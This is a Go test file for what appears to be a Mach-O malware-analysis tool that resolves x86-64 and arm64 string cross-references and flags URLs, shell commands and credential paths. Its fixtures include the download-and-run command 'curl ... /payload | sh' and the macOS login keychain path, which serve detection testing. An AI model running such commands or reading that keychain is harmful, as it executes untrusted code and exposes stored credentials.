				[]machoStringLiteral{{VA: 0x2040, Offset: 0x2040, Kind: "url", Value: "https://ambiguous-base.example.invalid"}},
			)
			if len(xrefs) != 0 {
				t.Fatalf("ambiguous-prefix base-relative form created xrefs: %#v", xrefs)
			}
		})
	}
}

func TestX86DirectCallDoesNotPropagateAmbiguousPrefixMove(t *testing.T) {
	for _, test := range []struct {
		name string
		move []byte
	}{
		{name: "multiple_rex", move: []byte{0x48, 0x48, 0x89, 0xc7}},
		{name: "rex_before_66", move: []byte{0x48, 0x66, 0x89, 0xc7}},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			command := "curl https://ambiguous-prefix.example/payload | sh"
			load := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
			callVA := 0x1000 + uint64(len(load)+len(test.move))
			call := encodeTestX86CALL(callVA, 0x1100)
			data := append(append(load, test.move...), call...)
			function := machoFunction{Name: "runShell", Start: 0x1000, End: 0x1000 + uint64(len(data)), Reachable: true}
			addMachOStringXref(&graph, content, "x86_64", machoStringXref{
				RefVA: 0x1000, Function: function,
				Literal: machoStringLiteral{VA: 0x2000, Offset: 0x2000, Kind: "shell-command", Value: command},
			})
			file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{testMachOSection("__cstring", 0x2000, append([]byte(command), 0))}}
			text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

			count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_system"}, nil, "x86_64")
			if hasOperationKind(&graph, behavior.OperationNetworkDownload) || hasOperationFlowRelation(graph.Relations) {
				t.Fatalf("ambiguous-prefix move propagated a shell argument: count=%d operations=%#v relations=%#v", count, graph.Operations, graph.Relations)
			}
		})
	}
}

func TestX86StringXrefsFindRIPRelativeURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x2000,
		Offset: 0x80,
		Value:  "https://xref.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 16)
	data[0] = 0x48
	data[1] = 0x8d
	data[2] = 0x3d
	disp := int32(literal.VA - (0x1000 + 7))
	binary.LittleEndian.PutUint32(data[3:7], uint32(disp))
	got := x86StringXrefs(&macho.File{ByteOrder: binary.LittleEndian}, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1010}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("x86StringXrefs() = %#v, want one xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x1000 {
		t.Fatalf("unexpected xref: %#v", got[0])
	}
}

func TestX86RIPRelativePointerRecoveryRequiresCanonicalREXW(t *testing.T) {
	const (
		instructionVA = uint64(0x1000)
		targetVA      = uint64(0x2000)
	)
	canonical := encodeTestX86RIPRelativeLEAToReg(8, instructionVA, targetVA)
	target, register, size, loadsMemory, ok := x86RIPRelativeTargetAndReg(instructionVA, canonical)
	if !ok || target != targetVA || register != 8 || size != len(canonical) || loadsMemory {
		t.Fatalf("canonical REX.W RIP-relative LEA was rejected: target=%#x register=%d size=%d loads=%v ok=%v", target, register, size, loadsMemory, ok)
	}

	encode := func(prefix []byte, opcode byte) []byte {
		out := append(append([]byte(nil), prefix...), opcode, 0x05, 0, 0, 0, 0)
		disp := int32(int64(targetVA) - int64(instructionVA+uint64(len(out))))
		binary.LittleEndian.PutUint32(out[len(out)-4:], uint32(disp))
		return out
	}
	for _, test := range []struct {
		name string
		data []byte
	}{
		{name: "32_bit_lea", data: encode(nil, 0x8d)},
		{name: "16_bit_mov", data: encode([]byte{0x66}, 0x8b)},
		{name: "rex_without_w", data: encode([]byte{0x40}, 0x8d)},
		{name: "rex_before_66", data: encode([]byte{0x48, 0x66}, 0x8d)},
		{name: "multiple_rex_lea", data: encode([]byte{0x48, 0x4c}, 0x8d)},
		{name: "multiple_rex_mov", data: encode([]byte{0x4c, 0x48}, 0x8b)},
	} {
		t.Run(test.name, func(t *testing.T) {
			if _, _, _, _, ok := x86RIPRelativeTargetAndReg(instructionVA, test.data); ok {
				t.Fatalf("noncanonical pointer form was accepted: %x", test.data)
			}
			literal := machoStringLiteral{VA: targetVA, Size: 8, Kind: "url", Value: "https://noncanonical.example.invalid"}
			xrefs, _ := x86StringXrefsIndexedBounded(
				&macho.File{ByteOrder: binary.LittleEndian}, newMachOSectionIndex(&macho.File{}), instructionVA, test.data,
				[]machoFunction{{Name: "main", Start: instructionVA, End: instructionVA + uint64(len(test.data))}},
				newMachOStringLiteralIndex([]machoStringLiteral{literal}), nil,
			)
			if len(xrefs) != 0 {
				t.Fatalf("noncanonical pointer form created an xref: %#v", xrefs)
			}
		})
	}
}

func TestX86StringXrefsFindPointerTableURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x3000,
		Offset: 0x180,
		Value:  "https://pointer-table.example/payload",
		Kind:   "url",
	}
	pointerData := make([]byte, 8)
	binary.LittleEndian.PutUint64(pointerData, literal.VA)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__const", 0x2000, pointerData),
		},
	}
	data := encodeTestX86RIPRelativeMOVToReg(0, 0x1000, 0x2000)

	got := x86StringXrefs(file, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1010}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("x86StringXrefs() = %#v, want one pointer-table xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x1000 {
		t.Fatalf("unexpected pointer-table xref: %#v", got[0])
	}
}

func TestX86StringXrefsDoesNotDereferenceLEAPointerTable(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x3000,
		Offset: 0x180,
		Value:  "https://lea-pointer-table.example/payload",
		Kind:   "url",
	}
	pointerData := make([]byte, 8)
	binary.LittleEndian.PutUint64(pointerData, literal.VA)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__const", 0x2000, pointerData),
		},
	}
	data := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)

	got := x86StringXrefs(file, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1010}}, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("LEA should not dereference pointer-table slots, got %#v", got)
	}
}

func TestX86StringXrefsFindBaseRelativeURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x2040,
		Offset: 0xc0,
		Value:  "https://base-relative.example/payload",
		Kind:   "url",
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	leaLiteral := encodeTestX86BaseDisp8(0x8d, 7, 0, 0x40)
	data := append(leaBase, leaLiteral...)

	got := x86StringXrefs(&macho.File{ByteOrder: binary.LittleEndian}, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("x86StringXrefs() = %#v, want one base-relative xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x1000+uint64(len(leaBase)) {
		t.Fatalf("unexpected base-relative xref: %#v", got[0])
	}
}

func TestX86StringXrefsFindSIBBaseRelativeURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x2040,
		Offset: 0xc0,
		Value:  "https://sib-base-relative.example/payload",
		Kind:   "url",
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	leaLiteral := encodeTestX86SIBBaseDisp8(0x8d, 7, 0, 0x40, 4)
	data := append(leaBase, leaLiteral...)

	got := x86StringXrefs(&macho.File{ByteOrder: binary.LittleEndian}, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("x86StringXrefs() = %#v, want one SIB base-relative xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x1000+uint64(len(leaBase)) {
		t.Fatalf("unexpected SIB base-relative xref: %#v", got[0])
	}
}

func TestX86StringXrefsRejectsIndexedSIBBaseRelativeURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x2040,
		Offset: 0xc0,
		Value:  "https://indexed-sib.example/payload",
		Kind:   "url",
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	leaLiteral := encodeTestX86SIBBaseDisp8(0x8d, 7, 0, 0x40, 1)
	data := append(leaBase, leaLiteral...)

	got := x86StringXrefs(&macho.File{ByteOrder: binary.LittleEndian}, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("indexed SIB address should remain unresolved, got %#v", got)
	}
}

func TestX86StringXrefsFindBaseRelativePointerTableURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x3000,
		Offset: 0x180,
		Value:  "https://base-pointer-table.example/payload",
		Kind:   "url",
	}
	pointerData := make([]byte, 0x48)
	binary.LittleEndian.PutUint64(pointerData[0x40:0x48], literal.VA)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__const", 0x2000, pointerData),
		},
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	movLiteral := encodeTestX86BaseDisp8(0x8b, 7, 0, 0x40)
	data := append(leaBase, movLiteral...)

	got := x86StringXrefs(file, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("x86StringXrefs() = %#v, want one base-relative pointer-table xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x1000+uint64(len(leaBase)) {
		t.Fatalf("unexpected base-relative pointer-table xref: %#v", got[0])
	}
}

func TestX86StringXrefsFindBaseNoDispPointerTableURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x3000,
		Offset: 0x180,
		Value:  "https://base-nodisp-pointer.example/payload",
		Kind:   "url",
	}
	pointerData := make([]byte, 8)
	binary.LittleEndian.PutUint64(pointerData, literal.VA)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__const", 0x2000, pointerData),
		},
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	movLiteral := encodeTestX86BaseNoDisp(0x8b, 7, 0)
	data := append(leaBase, movLiteral...)

	got := x86StringXrefs(file, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("x86StringXrefs() = %#v, want one no-displacement base pointer-table xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x1000+uint64(len(leaBase)) {
		t.Fatalf("unexpected no-displacement base pointer-table xref: %#v", got[0])
	}
}

func TestX86StringXrefsDoesNotReuseBaseAcrossFunctionBoundary(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x2040,
		Offset: 0xc0,
		Value:  "https://cross-function-base.example/payload",
		Kind:   "url",
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	leaLiteral := encodeTestX86BaseDisp8(0x8d, 7, 0, 0x40)
	data := append(leaBase, leaLiteral...)
	functions := []machoFunction{
		{Name: "setBase", Start: 0x1000, End: 0x1000 + uint64(len(leaBase))},
		{Name: "useBase", Start: 0x1000 + uint64(len(leaBase)), End: 0x1000 + uint64(len(data))},
	}

	got := x86StringXrefs(&macho.File{ByteOrder: binary.LittleEndian}, 0x1000, data, functions, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("base address state must not cross function boundaries, got %#v", got)
	}
}

func TestX86StringXrefsDoesNotTreatMOVLoadedPointerAsBase(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x2040,
		Offset: 0xc0,
		Value:  "https://mov-loaded-base.example/payload",
		Kind:   "url",
	}
	pointerData := make([]byte, 8)
	binary.LittleEndian.PutUint64(pointerData, 0x4000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__const", 0x2000, pointerData),
		},
	}
	movPointer := encodeTestX86RIPRelativeMOVToReg(0, 0x1000, 0x2000)
	leaLiteral := encodeTestX86BaseDisp8(0x8d, 7, 0, 0x40)
	data := append(movPointer, leaLiteral...)

	got := x86StringXrefs(file, 0x1000, data, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(data))}}, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("memory-loaded pointer should not become an address base, got %#v", got)
	}
}

func TestArm64StringXrefsFindADRPAddURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x100012340,
		Offset: 0x340,
		Value:  "https://arm64-xref.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 8)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, literal.VA))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, literal.VA&0xfff))
	file := &macho.File{ByteOrder: binary.LittleEndian}
	got := arm64StringXrefs(file, 0x100000000, data, []machoFunction{{Name: "main", Start: 0x100000000, End: 0x100000008}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("arm64StringXrefs() = %#v, want one xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x100000004 {
		t.Fatalf("unexpected xref: %#v", got[0])
	}
}

func TestArm64StringXrefsFindDirectADRURL(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x100000020,
		Offset: 0x20,
		Value:  "https://direct-adr.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 4)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADR(0, 0x100000000, literal.VA))
	file := &macho.File{ByteOrder: binary.LittleEndian}

	got := arm64StringXrefs(file, 0x100000000, data, []machoFunction{{Name: "main", Start: 0x100000000, End: 0x100000004}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("arm64StringXrefs() = %#v, want one direct ADR xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x100000000 {
		t.Fatalf("unexpected direct ADR xref: %#v", got[0])
	}
}

func TestArm64StringXrefsRejectRegister31PointerFlow(t *testing.T) {
	const textVA = uint64(0x100000000)
	for _, test := range []struct {
		name    string
		literal machoStringLiteral
		data    []uint32
	}{
		{
			name:    "sp_source",
			literal: machoStringLiteral{VA: 0x100012040, Offset: 0x2040, Value: "https://sp-fake.example.invalid", Kind: "url"},
			data: []uint32{
				encodeTestADRP(31, textVA, 0x100012000),
				encodeTestADDImmediate(0, 31, 0x40),
			},
		},
		{
			name:    "zero_register_move",
			literal: machoStringLiteral{VA: 0x100012340, Offset: 0x2340, Value: "https://xzr-fake.example.invalid", Kind: "url"},
			data: []uint32{
				encodeTestADRP(0, textVA, 0x100012300),
				encodeTestADDImmediate(0, 0, 0x300),
				encodeTestMOVRegister(31, 0),
				encodeTestMOVRegister(1, 31),
				encodeTestADDImmediate(2, 1, 0x40),
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			data := make([]byte, len(test.data)*4)
			for index, instruction := range test.data {
				binary.LittleEndian.PutUint32(data[index*4:index*4+4], instruction)
			}
			xrefs := arm64StringXrefs(
				&macho.File{ByteOrder: binary.LittleEndian}, textVA, data,
				[]machoFunction{{Name: "main", Start: textVA, End: textVA + uint64(len(data))}},
				[]machoStringLiteral{test.literal},
			)
			if len(xrefs) != 0 {
				t.Fatalf("register-31 fake pointer flow created xrefs: %#v", xrefs)
			}
		})
	}
}

func TestArm64StringXrefsDoesNotTreatBareADRPAsExactLiteral(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x100012000,
		Offset: 0x2000,
		Value:  "https://bare-adrp.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 4)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, literal.VA))
	file := &macho.File{ByteOrder: binary.LittleEndian}

	got := arm64StringXrefs(file, 0x100000000, data, []machoFunction{{Name: "main", Start: 0x100000000, End: 0x100000004}}, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("bare ADRP should not produce an exact string xref, got %#v", got)
	}
}

func TestArm64StringXrefsDoNotReuseRegistersAcrossFunctionBoundary(t *testing.T) {
	literal := machoStringLiteral{
		VA:     0x100012340,
		Offset: 0x340,
		Value:  "https://cross-function.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 8)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, literal.VA))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, literal.VA&0xfff))
	file := &macho.File{ByteOrder: binary.LittleEndian}
	functions := []machoFunction{
		{Name: "prepareAddress", Start: 0x100000000, End: 0x100000004},
		{Name: "useAddress", Start: 0x100000004, End: 0x100000008},
	}

	got := arm64StringXrefs(file, 0x100000000, data, functions, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("arm64StringXrefs should not carry address state across functions, got %#v", got)
	}
}

func TestArm64StringXrefsPropagatesMovedBaseRegister(t *testing.T) {
	base := uint64(0x100012300)
	literal := machoStringLiteral{
		VA:     base + 0x40,
		Offset: 0x340,
		Value:  "https://moved-arm64-base.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, base))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, base&0xfff))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestMOVRegister(1, 0))
	binary.LittleEndian.PutUint32(data[12:16], encodeTestADDImmediate(2, 1, 0x40))
	file := &macho.File{ByteOrder: binary.LittleEndian}

	got := arm64StringXrefs(file, 0x100000000, data, []machoFunction{{Name: "main", Start: 0x100000000, End: 0x100000010}}, []machoStringLiteral{literal})
	if len(got) != 1 {
		t.Fatalf("arm64StringXrefs() = %#v, want one moved-base xref", got)
	}
	if got[0].Function.Name != "main" || got[0].Literal.Value != literal.Value || got[0].RefVA != 0x10000000c {
		t.Fatalf("unexpected moved-base xref: %#v", got[0])
	}
}

func TestArm64StringXrefsDoesNotTreatLoadedPointerSlotAsAddressBase(t *testing.T) {
	const slot = uint64(0x100012000)
	literal := machoStringLiteral{
		VA: slot + 0x40, Offset: 0x2040,
		Value: "https://loaded-slot-arm64.example/payload", Kind: "url",
	}
	pointerData := make([]byte, 8)
	binary.LittleEndian.PutUint64(pointerData, 0x100030000)
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{testMachOSection("__const", slot, pointerData)}}
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, slot))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, slot&0xfff))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestLDRXUnsigned(0, 0, 0))
	binary.LittleEndian.PutUint32(data[12:16], encodeTestADDImmediate(1, 0, 0x40))

	got := arm64StringXrefs(file, 0x100000000, data, []machoFunction{{Name: "main", Start: 0x100000000, End: 0x100000010}}, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("memory-loaded pointer slot became an address base: %#v", got)
	}
}

func TestArm64StringXrefsInvalidatesOverwrittenBaseRegister(t *testing.T) {
	base := uint64(0x100012300)
	literal := machoStringLiteral{
		VA:     base + 0x40,
		Offset: 0x340,
		Value:  "https://stale-arm64-base.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, base))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, base&0xfff))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestMOVRegister(0, 1))
	binary.LittleEndian.PutUint32(data[12:16], encodeTestADDImmediate(2, 0, 0x40))
	file := &macho.File{ByteOrder: binary.LittleEndian}

	got := arm64StringXrefs(file, 0x100000000, data, []machoFunction{{Name: "main", Start: 0x100000000, End: 0x100000010}}, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("overwritten arm64 base register should not produce stale xrefs, got %#v", got)
	}
}

func TestArm64StringXrefsClearBaseAfterUnmodeledMultiRegisterWrite(t *testing.T) {
	base := uint64(0x100012300)
	literal := machoStringLiteral{
		VA:     base + 0x40,
		Offset: 0x340,
		Value:  "https://stale-multireg-arm64.example/payload",
		Kind:   "url",
	}
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(1, 0x100000000, base))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(1, 1, base&0xfff))
	binary.LittleEndian.PutUint32(data[8:12], 0xa9400440) // LDP X0, X1, [X2]
	binary.LittleEndian.PutUint32(data[12:16], encodeTestADDImmediate(2, 1, 0x40))
	file := &macho.File{ByteOrder: binary.LittleEndian}

	got := arm64StringXrefs(file, 0x100000000, data, []machoFunction{{Name: "main", Start: 0x100000000, End: 0x100000010}}, []machoStringLiteral{literal})
	if len(got) != 0 {
		t.Fatalf("address state crossed an unmodeled multi-register write: %#v", got)
	}
}

func TestStringLiteralForPointerNormalizesMachOPointerOffsets(t *testing.T) {
	file := &macho.File{Sections: []*macho.Section{{
		SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: 0x1000},
	}}}
	literal := machoStringLiteral{
		VA:    0x100000544,
		Value: "https://pointer-xref.example/payload",
		Kind:  "url",
	}
	for _, pointer := range []uint64{0x100000544, 0x544, 0x0010000000000544} {
		got, ok := stringLiteralForPointer(file, []machoStringLiteral{literal}, pointer)
		if !ok || got.Value != literal.Value {
			t.Fatalf("stringLiteralForPointer(%#x) = %#v, %v", pointer, got, ok)
		}
	}
}

func TestNormalizedMachOPointersIncludesImageRelativeOffsets(t *testing.T) {
	file := &macho.File{Sections: []*macho.Section{{
		SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: 0x1000},
	}}}
	got := normalizedMachOPointers(file, 0x544)
	want := []uint64{0x544, 0x100000544}
	if len(got) != len(want) {
		t.Fatalf("normalizedMachOPointers() = %#v; want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("normalizedMachOPointers() = %#v; want %#v", got, want)
		}
	}
}

func TestMachOStringLiteralIndexFindsContainingOuterRange(t *testing.T) {
	index := newMachOStringLiteralIndex([]machoStringLiteral{
		{VA: 0x1000, Size: 0x100, Value: "outer"},
		{VA: 0x1050, Size: 1, Value: "inner"},
	})

	got, ok := index.forVA(0x1075)
	if !ok || got.Value != "outer" {
		t.Fatalf("nested literal lookup = %#v, %v; want containing outer range", got, ok)
	}
}

func TestMachOStringLiteralIndexRequiresShellCommandStartAddress(t *testing.T) {
	command := "curl https://command.example/payload | sh"
	index := newMachOStringLiteralIndex([]machoStringLiteral{
		{VA: 0x1000, Size: len(command), Value: command, Kind: "shell-command"},
		{VA: 0x1005, Size: len("https://command.example/payload"), Value: "https://command.example/payload", Kind: "url"},
	})

	got, ok := index.forVA(0x1000)
	if !ok || got.Kind != "shell-command" || got.Value != command {
		t.Fatalf("command-start lookup = %#v, %v; want exact shell command", got, ok)
	}
	if got, ok := index.forVA(0x1001); ok {
		t.Fatalf("interior command address must not alias the complete command: %#v", got)
	}
	got, ok = index.forVA(0x1005)
	if !ok || got.Kind != "url" {
		t.Fatalf("an exact nested URL candidate should remain independently addressable: %#v, %v", got, ok)
	}
}

func TestMachOStringLiteralIndexRejectsOverflowedRange(t *testing.T) {
	index := newMachOStringLiteralIndex([]machoStringLiteral{{
		VA:    ^uint64(0) - 1,
		Size:  4,
		Value: "overflow",
	}})

	if got, ok := index.forVA(0); ok {
		t.Fatalf("overflowed literal range matched low address: %#v", got)
	}
}

func TestNormalizedMachOPointersDoesNotWrapImageRelativeOffsets(t *testing.T) {
	index := &machoSectionIndex{imageBase: ^uint64(0) - 0x10}
	got := normalizedMachOPointersIndexed(index, 0x20)
	if len(got) != 1 || got[0] != 0x20 {
		t.Fatalf("overflowing image-relative pointer should be skipped, got %#v", got)
	}
}

func TestMachOStringXrefAddsFunctionScopedResourceFeature(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: machoFunction{Name: "collect", Start: 0x1000, End: 0x1010},
		Literal: machoStringLiteral{
			VA:       0x2000,
			Offset:   42,
			Kind:     "sensitive-resource",
			Value:    "~/Library/Keychains/login.keychain-db",
			Resource: behavior.Resource{Kind: behavior.ResourceCredentialStore, Value: "~/Library/Keychains/login.keychain-db", Classifications: []behavior.ResourceClassification{behavior.ResourceClassKeychain}},
		},
	})
	if len(graph.Features) != 1 || graph.Features[0].SourceFunction != "collect" || graph.Features[0].Qualifiers["function"] != "collect" {
		t.Fatalf("xref should add a function-scoped feature: %#v", graph.Features)
	}
	if len(graph.Evidence) != 2 {
		t.Fatalf("xref should keep reference and literal locations separate: %#v", graph.Evidence)
	}
	if graph.Evidence[0].Method != "macho-literal" || graph.Evidence[0].Kind != "sensitive-resource-literal" || !graph.Evidence[0].ByteOffsetKnown() || graph.Evidence[0].Offset != 42 || graph.Evidence[0].VA != 0x2000 || graph.Evidence[0].ScopeID != "" {
		t.Fatalf("literal evidence has the wrong location: %#v", graph.Evidence[0])
	}
	if graph.Evidence[1].Function != "collect" || graph.Evidence[1].Method != "macho-xref" || graph.Evidence[1].Kind != "sensitive-resource-xref" || graph.Evidence[1].VA != 0x1000 || graph.Evidence[1].ByteOffsetKnown() {
		t.Fatalf("reference evidence has the wrong location: %#v", graph.Evidence[1])
	}
}

func TestServiceManagementStringLiteralRecognition(t *testing.T) {
	tests := []struct {
		value string
		want  bool
	}{
		{"com.example.helper", true},
		{"com.example.agent.plist", true},
		{"io.acme.UpdateHelper", true},
		{"com.example.update_agent.plist", true},
		{"example.invalid", false},
		{"https://com.example.helper", false},
		{"/Library/LaunchAgents/com.example.agent.plist", false},
		{"Applemachdep.cpu.brand_string", false},
		{"machdep.cpu.brand_string", false},
		{"com.example.update_agent", false},
		{"cOm.example.helper", false},
		{"1com.example.helper", false},
		{"com..helper", false},
	}
	for _, tt := range tests {
		if got := looksServiceManagementResource(tt.value); got != tt.want {
			t.Fatalf("looksServiceManagementResource(%q) = %v, want %v", tt.value, got, tt.want)
		}
	}
	if got := serviceManagementLiteralCategory("com.example.agent.plist"); got != "plist-name" {
		t.Fatalf("plist literal category = %q", got)
	}
	if got := serviceManagementLiteralCategory("com.example.helper"); got != "bundle-id" {
		t.Fatalf("bundle literal category = %q", got)
	}
}

func TestProcessLaunchPathLiteralRecognition(t *testing.T) {
	tests := []struct {
		value string
		want  bool
	}{
		{"/usr/bin/curl", true},
		{"/usr/sbin/system_profiler", true},
		{"/usr/local/bin/tool", true},
		{"/opt/homebrew/bin/tool", true},
		{"/bin/sh", true},
		{"/bin/zsh", true},
		{"/tmp/payload", true},
		{"/tmp/staging/var/helper", true},
		{"/Applications/Google Chrome.app/", true},
		{"/System/Applications/System Settings.app/", true},
		{"/Applications/Visual Studio.app/Contents/MacOS/VisualStudio", true},
		{"/Library/Keychains/login.keychain-db", false},
		{"/Users/example/Documents/file.txt", false},
		{"file:///usr/bin/curl", false},
		{"/bin/zshX", false},
		{"/bin/H", false},
		{"/bin/", false},
		{"/Applications/Google", false},
		{"/Applications/Microsoft", false},
		{"/Applications/Visual", false},
		{"/Applications/", false},
		{"/Applications/Xcode.app/Contents/Developer/SDKs/MacOSX.sdk/usr/include/limits", false},
	}
	for _, tt := range tests {
		if got := looksProcessLaunchPath(tt.value); got != tt.want {
			t.Fatalf("looksProcessLaunchPath(%q) = %v, want %v", tt.value, got, tt.want)
		}
	}
}

func TestMachOApplicationPathMatchesPreserveCompleteSpacedBundles(t *testing.T) {
	value := `{"path":"/Applications/Google Chrome.app/","other":"/Applications/Microsoft Teams classic.app/","third":"/Applications/Visual Studio.app/"}`
	matches, truncated := limitedMachOApplicationPathMatches(value)
	if truncated {
		t.Fatal("three bounded application paths should not exhaust the match budget")
	}
	var got []string
	for _, match := range matches {
		got = append(got, value[match[0]:match[1]])
	}
	want := []string{
		"/Applications/Google Chrome.app/",
		"/Applications/Microsoft Teams classic.app/",
		"/Applications/Visual Studio.app/",
	}
	if !slices.Equal(got, want) {
		t.Fatalf("application path matches = %#v; want %#v", got, want)
	}

	packed := "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome$USER"
	matches, truncated = limitedMachOApplicationPathMatches(packed)
	if truncated || len(matches) != 1 {
		t.Fatalf("packed application executable matches = %#v, truncated=%v", matches, truncated)
	}
	if got := packed[matches[0][0]:matches[0][1]]; got != "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" {
		t.Fatalf("packed application executable = %q", got)
	}
}

func TestMachOPackedStringNoiseDoesNotBecomeMalformedResources(t *testing.T) {
	seen := map[string]bool{}
	var literals []machoStringLiteral
	for index, value := range []string{
		"/bin/zshX",
		"/Applications/Google Chrome.app/",
		"/tmp/com.apple.lock/cron/cron_asked/var/at/tabs/no",
		"Applemachdep.cpu.brand_string",
	} {
